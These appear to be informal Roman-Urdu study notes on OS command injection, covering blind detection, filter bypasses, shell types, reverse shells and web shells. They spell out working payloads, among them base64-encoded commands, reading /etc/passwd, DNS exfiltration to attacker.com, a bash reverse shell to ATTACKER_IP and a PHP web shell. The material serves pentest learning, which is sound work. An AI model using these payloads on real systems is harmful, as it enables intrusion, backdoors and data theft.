### ⚡ Important Hidden Points about OS Command Injection:

1. **Whitespace bypass**
   Developer agar spaces block kare, toh hum tabs (`%09`), newlines (`%0a`), `$IFS` ya `{cat,file.txt}` style se space bypass kar sakte hain. Yeh trick kaam logon ko pata hoti hai.

2. **Output redirection**
   Blind injection mein agar response na aaye, toh hum output ko file mein save karwa sakte hain (`> /var/www/html/test.txt`) aur phir browser se woh file access kar ke result dekh sakte hain.

3. **Operators ke chaining power**
   Sirf `;` use nahi hota — `&&`, `||`, `|`, `` `command` ``, `$(command)` — yeh sab alternative hain aur different behavior dete hain. Example: `&&` sirf tab chalega jab pehla command successful ho.

4. **Encoding & Obfuscation**
   Command injection ko WAF block karne ki koshish kare toh hum Base64 encoding (`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`) ya hex/URL encoding se commands chala sakte hain.

5. **Environment Variables abuse**
   Kaam log jante hain ke `$PATH`, `$HOME`, `$SHELL`, `$UID` direct injection mein kaam aa sakte hain. Example: `;echo $PATH;` se sensitive info leak ho jaata hai.

6. **Time-based blind tricks**
   Agar response na aaye toh `ping -c 10 127.0.0.1` ya `sleep 10` use kar ke delay create kar dete hain. Isse confirm hota hai ke injection chal rahi hai.

7. **Chaining with existing commands**
   Agar developer `ping` ya `ls` hardcoded use kar raha hai, toh hum uske saath extra command jod dete hain. Example: `127.0.0.1; cat /etc/passwd`.

8. **Command Injection ≠ RCE always**
   Har injection RCE nahi hoti. Kabhi kabhi restricted shell, AppArmor, ya Docker container ke andar command execute hoti hai. Fir bhi sensitive info leak ho sakta hai.

9. **DNS exfiltration**
   Agar output dekhne ka tareeqa hi na ho, toh hum `nslookup $(cat /etc/passwd).attacker.com` type command daal kar apni controlled DNS server par data exfiltrate kar sakte hain. Yeh bahut kam log use karte hain.

10. **Developer ki common ghalti**
    Bohat saare developers input ko `escapeshellcmd()` ya `escapeshellarg()` (PHP) se sanitize karte hain, lekin yeh har case cover nahi karta. Agar proper whitelist na ho toh injection ho hi jaata hai.

---

💡 Penetration Testing ka faida:
Agar tum real world mein OS Command Injection pakar lo, toh tum **server ka full control (Privilege Escalation)** le sakte ho. Lekin agar full RCE possible na bhi ho, toh bhi tum sensitive files read, SSRF trigger, ya internal network access kar sakte ho — jo bug bounty mein **critical severity** hota hai.

---

### 🔑 OS Command Injection + `whoami` samajh lo:

1. Jab tum apne **Windows PC** par `whoami` chalate ho → tumhe apne system ka **current logged-in user** milta hai. Example:

   ```
   C:\Users\Muhammad Habib Awan
   whoami
   muhammadhabibawan
   ```

2. Agar tum **website ke server** par injection karte ho aur `whoami` run ho jata hai, toh woh **server ka user** dikhayega — na ke website ka owner ya domain ka user.
   Example:

   * Website: `khan.com`
   * Server: Linux chal raha hai aur Apache web server run ho raha hai
   * Apache usually `www-data` (Ubuntu) ya `apache` (CentOS) user ke under hota hai.
   * Tumhe milega:

     ```
     whoami
     www-data
     ```

3. Matlab tumhe **server par kis account se command chal rahi hai** yeh confirm ho jata hai. Isko “context” kehte hain.

4. Agar woh user `root` ho gaya → toh samjho tumne **server ka full control** le liya. Lekin aksar normal limited user milta hai (`www-data`, `apache`, `nginx`). Phir agla kaam hota hai **Privilege Escalation**.

---

👉 Tumhari example sahi hai, bas clarify yeh hai:

* Agar server Linux hai aur user `rock` se chal raha hai → toh `whoami` “rock” show karega.
* Agar server Windows hai aur user `Administrator` se chal raha hai → toh `whoami` “administrator” show karega.

---

⚡ Penetration Testing Tip:
Always pehla kaam injection confirm karne ke baad `whoami`, `uname -a`, `id` (Linux) ya `systeminfo` (Windows) chalana hota hai — isse tumhe **system ki fingerprinting** mil jaati hai. Yeh chhupi hui info bug bounty mein **critical proof of concept (PoC)** hoti hai.

---

Jo commands hum apne Linux ya Windows PC pe chalate hain **wohi same commands website ke server pe bhi chalti hain** agar tumhe OS Command Injection mil gaya ho.

---

### 📌 Example samajh lo:

#### Agar server **Linux** hai:

* `whoami` → kaunsa user chal raha hai (`www-data`, `root`, `nginx`)
* `id` → user ke groups + UID/GID
* `uname -a` → pura OS version (kernel info, Linux distro)
* `pwd` → current working directory
* `ls -la` → files/folders list

#### Agar server **Windows** hai:

* `whoami` → current user (e.g., `iis apppool\defaultapppool`)
* `systeminfo` → Windows version, hostname, patch level
* `echo %USERNAME%` → current username
* `echo %USERDOMAIN%` → domain/workgroup
* `dir` → files/folders list

---

### ⚡ Important baat:

Tum apne computer pe bhi yeh commands run karke dekh lo → jo result apke machine ka deta hai, wahi same tarike se server ke environment ka dega.
Farq bas itna hai ke:

* Tumhara PC → tumhari local info dikhayega.
* Website ka server → us server ka user + OS details dikhayega.

---

👉 Isi liye OS Command Injection itni powerful vulnerability hai — kyunki tum server ki andar ki **asli identity** dekh lete ho.
Bug bounty mein sirf `whoami` ka result proof of concept ke liye kaafi hota hai.

---

### 🔎 Scenario samajh lo:

1. **Ping test (`ping -c 10 127.0.0.1`)**
   Agar server 10 sec delay karta hai → iska matlab hai **server tumhari command sun raha hai**. Yani **OS Command Injection confirm** ✅.

2. **Next step: Information gathering**
   Naturally hum `whoami`, `id`, `uname -a`, ya `systeminfo` run karte hain taake system ki identity mile.

3. **Agar `whoami` ka response aa jaye**
   → Toh ye **Normal Command Injection** hai (response-based). Easy mode. Tum direct commands ke output dekh sakte ho.

4. **Agar `whoami` error de ya koi response na aaye**
   → Toh ye **Blind Command Injection** hai. Matlab command chal rahi hai, lekin tumhe **direct output nahi mil raha**.

---

### 🔧 Blind Command Injection handle karne ke tareeqe:

1. **Time-based technique**

   * Example: `sleep 5` ya `ping -c 5 127.0.0.1`
   * Isse confirm hota hai ke command chal rahi hai.

2. **File-based output redirection**

   * `whoami > /var/www/html/test.txt`
   * Phir browser se `khan.com/test.txt` open karke result dekh lo.

3. **DNS Exfiltration** (kaam log use karte hain ⚡)

   * `nslookup $(whoami).attacker.com`
   * Tumhare DNS server pe user ka naam chala aayega.

4. **Encoding / Obfuscation tricks**

   * Agar WAF block kar raha ho toh `whoami` ko encode karke chala sakte ho:

     ```
     echo d2hvYW1p | base64 -d | sh
     ```

     (yeh `whoami` ko Base64 se decode karke execute karega).

---

👉 Matlab:

* Agar response aa raha hai = **Direct Command Injection**
* Agar sirf delay ya side-effects mil rahe hain = **Blind Command Injection**
* Blind mein hum encoding, redirection aur exfiltration tricks se output nikalte hain.

---

⚡ PenTest Tip:
Bug bounty mein **sirf sleep/delay proof** dikhana bhi kaafi hota hai — kyunki ye hi critical severity proof hai ke tum OS ke commands execute kar rahe ho.

---

### 🔍 Agar `ping -c 10 127.0.0.1` ya `sleep 5` na chale toh?

* Yeh **100% proof nahi hai** ke OS Command Injection impossible hai.
* Matlab sirf itna hota hai ke tumhari **wo specific syntax** server ne accept nahi kiya.

---

### ⚡ Kya possibilities ho sakti hain?

1. **Different OS / Shell**

   * Tum `ping -c 10` (Linux style) use kar rahe ho, lekin shayad server Windows hai.
   * Windows mein `ping -n 10 127.0.0.1` hota hai aur delay ke liye `timeout 5` use hota hai.

2. **Different shell interpreter**

   * Har server `bash` nahi chalata.
   * Kabhi `sh`, `csh`, ya `powershell` hota hai.
   * Ek command jo bash mein chalti hai woh sh mein fail ho sakti hai.

3. **Output suppressed / sandboxed**

   * Kabhi-kabhi developer output ko log file mein redirect kar deta hai ya sanitize kar deta hai. Tumhe error dikh raha hai, lekin andar command chal bhi sakti hai.

4. **WAF / Filtering**

   * Agar WAF laggi hai toh woh `sleep`, `ping`, `whoami` jaise common keywords ko block kar deti hai.
   * Lekin tum obfuscation (e.g., `sl\eep 5`, base64 decode, variable tricks) se bypass kar sakte ho.

5. **Partial injection possible**

   * Ho sakta hai tum sirf ek parameter mein inject kar rahe ho aur woh vulnerable na ho.
   * Dusre parameters (headers, cookies, hidden fields) vulnerable ho sakte hain.

---

### 🛠️ Real Pentester Approach

Agar simple commands fail ho jayein toh tester kya karta hai:

* Linux ke liye test:

  ```
  ;id;
  ;uname -a;
  ;cat /etc/passwd;
  ```
* Windows ke liye test:

  ```
  & whoami
  & ver
  & dir
  & echo test
  ```
* WAF bypass ke liye:

  * Command ko split karna → `who$uami`
  * Encodings → URL encode (`%77hoami`), Base64, Hex
  * Variables → `${PATH}`, `$IFS`, `%USERNAME%`

---

👉 Matlab: Agar ek do commands fail ho jayein toh iska matlab **injection impossible nahi hoti**.
Tumhe **OS + shell identify karke, obfuscation aur alternate syntax try karna padta hai**.

---

⚡ PenTest Tip:
Kabhi apni testing approach ko **cross-OS mindset** se dekhna. Matlab ek hi parameter ko Linux aur Windows dono style se test karo. Bahut cases mein log `sleep` try kar ke chhod dete hain aur Windows commands test hi nahi karte.

---

### 🔑 Bash kya hai?

* **Bash** ka full form hai: **Bourne Again Shell**.
* Yeh basically ek **command-line shell aur scripting language** hai jo **Linux** aur **Mac** systems par default hoti hai.
* Matlab jo bhi tum Linux mein terminal pe command likhte ho (`ls`, `pwd`, `cat /etc/passwd`, etc.) woh **bash** interpret karke OS ko samjhata hai.

---

### ⚙️ Role of Bash in Servers

* Websites jo **Linux server** pe chalti hain (Apache, Nginx), unke background mein agar developer ne user input ko system command ke sath concatenate kar diya → woh command **bash shell** ko chali jaati hai.
* Example:

  ```php
  system("ping -c 1 " . $_GET['ip']);
  ```

  Agar tumne `; whoami` inject kiya → toh woh `ping -c 1 127.0.0.1; whoami` ban jaata hai → aur **bash usse execute kar deta hai**.

---

### 🛠️ Real-world samajh lo:

* Tum apne Windows PC mein **cmd** use karte ho (black window).
* Linux/Mac users **bash** use karte hain (terminal).
* Dono ka kaam same: **commands ko OS tak pohchana aur output dena**.

---

### ⚡ Penetration Testing angle

1. OS Command Injection zyada tar Linux servers pe milegi, matlab **bash commands** chalengi.
2. Agar server Windows hai toh tumhe **cmd** ya **PowerShell** style commands test karni hongi (`dir`, `ver`, `timeout`, etc.).
3. Bash mein bohot saare **special operators** hote hain jo injection ke liye goldmine hain:

   * `;` → command chaining
   * `&&` / `||` → conditional execution
   * `` `command` `` ya `$(command)` → command substitution
   * `$IFS` → space bypass

---

👉 Matlab:
**Bash ek interpreter hai jo tumhari commands ko samjhata hai aur execute karwata hai.**
Agar tum OS Command Injection crack karna chahte ho toh bash ka thoda game seekhna zaroori hai.

---

### 1. **Shell kya hai?**

* Shell ek **interface** hai jo tumhe **operating system** se baat karne deta hai.
* Matlab tum command likhte ho aur shell us command ko OS tak pohchata hai.
* Shell **ek generic concept** hai.

Think of it like:
👉 *“Mobile phone” ek concept hai, lekin uske andar Samsung, iPhone, Huawei alag models hote hain.*

---

### 2. **Bash kya hai?**

* Bash ek **specific type ka shell** hai.
* Full form: **Bourne Again Shell**.
* Yeh Linux aur macOS mein sabse zyada common hai.

Think of it like:
👉 *“Samsung Galaxy S23” ek phone model hai — jo phone ka ek specific version hai.*

---

### 3. **Examples samajh lo**

Asan Alfaz Main 
Bash shell ki aik type hai

* **Shells ke types**:

  * `sh` → Bourne Shell (purana)
  * `bash` → Bourne Again Shell (modern)
  * `csh` → C Shell
  * `zsh` → Z Shell
  * `powershell` → Windows Shell

* Matlab **bash ek shell hai**, lekin har shell bash nahi hota.

---

### 4. **Penetration Testing Angle**

* Jab tum OS Command Injection test karte ho:

  * Agar server Linux hai → aksar woh commands **bash** ya **sh** shell ko forward karta hai.
  * Agar server Windows hai → woh commands **cmd.exe** ya **PowerShell** ko forward karega.

Isliye agar tum Linux server pe injection karo aur `sleep 5` chal jaye → samjho bash/sh chal raha hai.
Aur agar Windows hai toh tumhe `timeout 5` ya `ping -n 5 127.0.0.1` test karna hoga.

---

* **User → Shell → OS → Shell → User**
  Tum command likhte ho (request) → shell OS ko deta hai (server ki tarah) → OS process karta hai → shell tumhe result wapas dikhata hai.

---

**Shell user aur operating system ke darmiyan ek server ki tarah kaam karta hai.**
Tumhari request forward karta hai, result laata hai aur tumhe dikhata hai.

---

Aksar Linux distributions (Ubuntu, Kali, Debian, Fedora etc.) bash ko default shell banate hain.

Matlab jab tum terminal kholo aur ls, pwd, whoami likho → woh commands bash interpret kar raha hota hai.

---

**Hacking (specially OS Command Injection / RCE / Server Exploitation)** mein yeh samajhna ke **server kaunsa shell use kar raha hai** bahut bada role play karta hai.

---

### 🔑 Kyu zaroori hai shell type ka pata hona?

1. **Commands ka syntax different hota hai**

   * Linux + bash/sh: `ls`, `cat /etc/passwd`, `sleep 5`
   * Windows + cmd: `dir`, `type C:\Windows\win.ini`, `timeout 5`
   * Windows + PowerShell: `Get-ChildItem`, `Get-Content`, `Start-Sleep`
     👉 Agar tumhe pata na ho kaunsa shell chal raha hai, tumhari commands fail ho jaayengi.

2. **Operators aur tricks different hoti hain**

   * Bash: `;`, `&&`, `||`, `` `command` ``, `$(command)`
   * Windows cmd: `&`, `&&`, `||`
   * PowerShell: `;`, `|`, backtick (\`)
     👉 Agar tum wrong syntax use karoge, server error de dega aur tum samjhoge “vulnerable nahi hai”, jabke asal mein vulnerable hoga.

3. **Bypass techniques shell pe depend karti hain**

   * Bash mein `$IFS`, `${PATH}`, encoding tricks kaam aati hain.
   * PowerShell mein `-EncodedCommand` kaam karta hai.
   * CMD mein batch scripting tricks kaam karti hain.

4. **Privilege escalation bhi shell se linked hoti hai**

   * Agar tum server pe foothold le lo aur tumhe bash mili ho → tum Linux privesc techniques use karoge.
   * Agar PowerShell mila ho → tum Windows AD attacks aur PowerShell scripts use karoge.

---

### ⚡ Real-World Example

Suppose tumhe ek website pe command injection mila:

* Tum likhte ho: `; whoami` → error aata hai.
* Tum sochoge vulnerable nahi hai.
* Lekin asal mein woh **Windows server** tha → usme `whoami` likhne se kaam hota, ya phir PowerShell ke liye `Get-ChildItem` use karna padta.
  👉 Isliye shell type ka knowledge hone se tum 1st step pe hi detect kar lete.

---

### ✅ Conclusion

**Shell type ka pata hona zaroori hai** kyunki:

* Sahi commands run karne ke liye
* WAF bypass karne ke liye
* Exploitation aur privesc design karne ke liye

---

## 🔑 Basic Technical Terms

### 1. **Interpreter**

* Interpreter ek **translator** hota hai jo tumhari likhi commands / code ko **line by line** samajhta aur OS/machine ko chalata hai.
  👉 Example: Tum likhte ho `ls`, interpreter (shell) usko system call banata hai aur OS ko bhejta hai.

---

### 2. **Command Interpreter**

* Ye ek special type ka interpreter hai jo specifically **commands** ko samajhta hai (bash, sh, cmd, powershell).
  👉 Matlab shell hi ek **command interpreter** hai.

---

### 3. **Parse / Parsing**

* Parse ka matlab hai ek cheez ko todna, samajhna aur rules ke hisaab se arrange karna.
  👉 Example:
  Tum likhte ho:

  ```bash
  ls -l /home
  ```

  Shell isko parse karta hai:

  * Command = `ls`
  * Option = `-l`
  * Argument = `/home`
    Fir OS ko bhej deta hai.

---

### 4. **Implementation**

* Implementation ka matlab hota hai ek concept ko actual program bana ke chalana.
  👉 Example:

  * Concept = “Shell”
  * Implementation = `bash`, `sh`, `zsh`, `powershell`

---

## ⚡ Hacking Shells

### 5. **Reverse Shell**

* Normal shell = tum local terminal pe ho.
* Reverse shell = tum exploit karte ho server ko, aur woh **server tumhare machine se connect karke tumhe shell deta hai**.
  👉 Real life: jaise tum kisi ghar mein ghusna chahte ho, lekin darwaza band hai → andar ka banda khud khidki kholke tumhe andar bula leta hai.

Command example (server se tumhare IP pe connect):

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

### 6. **Web Shell**

* Web shell ek **script file (PHP, ASP, JSP)** hoti hai jo tum server pe upload karte ho.
* Jab tum URL hit karte ho, woh tumhari commands execute karke output web page pe dikhati hai.
  👉 Example:

```php
<?php system($_GET['cmd']); ?>
```

URL:

```
http://victim.com/shell.php?cmd=whoami
```

Output:

```
www-data
```

👉 Real life: jaise tum ek ghar ke andar camera chhupake lagado, aur bahar se mobile se control karo.

---

## ✅ Quick Summary (Easy Urdu)

* **Interpreter** = translator
* **Command Interpreter** = jo commands translate kare (shell)
* **Parse** = tod ke samajhna aur rules lagana
* **Implementation** = asal program (bash, sh, etc.)
* **Reverse Shell** = server tumse connect ho jaye aur tumhe access de de
* **Web Shell** = ek script jo server pe permanent backdoor ban jaye

---

# 🔥 Reverse Shell (Deep)

Reverse shell ka actual process yeh hota hai:

1. **Vulnerability se foothold**

   * Tumhe koi bug mila: jaise OS Command Injection, RCE, ya file upload.
   * Tum pehli command test karte ho: `whoami`, `id`, `uname -a` → server reply deta hai.
   * Matlab tum server ko commands chalwane pe majboor kar chuke ho ✅.

2. **Server se tumhari machine tak connection**

   * Ab tum chahte ho ke ek **persistent, interactive shell** mile (sirf ek command run karne wali access nahi).
   * Iske liye tum server ko force karte ho ke woh tumhari **attacker machine ke IP aur port** se connect ho jaye.
   * Example (Linux Bash):

     ```bash
     bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
     ```
   * Tum apni machine pe `nc -lvnp 4444` chalate ho → jaise hi server connect hota hai, tumhe ek **interactive terminal** mil jata hai.

3. **Shell ka type samajhna**

   * Jaise tumne kaha: ab tum `echo $0` ya `echo $SHELL` se check karte ho ki server kis shell pe chal raha hai (bash, sh, zsh).
   * Phir uske hisaab se commands aur payloads banate ho.

👉 **Reverse shell = server tumhare ghar phone karke khud apni zubaan mein baat karna shuru kar deta hai.**
Sirf ek command chalana nahi, balki full live access.

---

# 🔥 Web Shell (Deep)

1. **Foothold by File Upload**

   * Tum server pe ek script upload karte ho (PHP, ASPX, JSP etc.).
   * Is script ka code aisa hota hai:

     ```php
     <?php system($_GET['cmd']); ?>
     ```
   * Matlab browser ke URL me `?cmd=whoami` likhne se tumhari command chalti hai.

2. **Remote command execution through browser**

   * Tum test karte ho: `http://victim.com/shell.php?cmd=whoami`
   * Server ka response: `www-data` (user ka naam).
   * Matlab tumne ek **permanent backdoor** bana diya server pe jo web ke zariye control hota hai.

3. **Difference from Reverse Shell**

   * Web shell me tum **browser + URL** ke through commands chalate ho.
   * Reverse shell me tumhari machine aur server ke darmiyan **direct connection** ban jata hai, zyada interactive aur powerful.

👉 **Web shell = server pe ek chhupa hua remote control app jo tum browser se operate karte ho.**
Jaise tumne Carlos ki secret key nikali — wo ek real web shell exploitation hi tha.

---

# ⚡ Reverse vs Web Shell (Quick Comparison)

| Feature         | Reverse Shell                                      | Web Shell                                               |
| --------------- | -------------------------------------------------- | ------------------------------------------------------- |
| **Access**      | Server → Attacker machine                          | Attacker → Server (via URL)                             |
| **Persistence** | Temporary (connection toot jaye to khatam)         | Permanent (file rehti hai jab tak delete na ho)         |
| **Interaction** | Interactive (jaise tum khud terminal pe baithe ho) | Limited (har command ek ek karke URL se run karni)      |
| **Use-case**    | OS Command Injection, RCE exploit ke baad          | File upload, misconfigurations                          |
| **Detection**   | IDS/IPS easily catch network reverse connections   | Web shell file easily detect hone lagti hai scanners se |

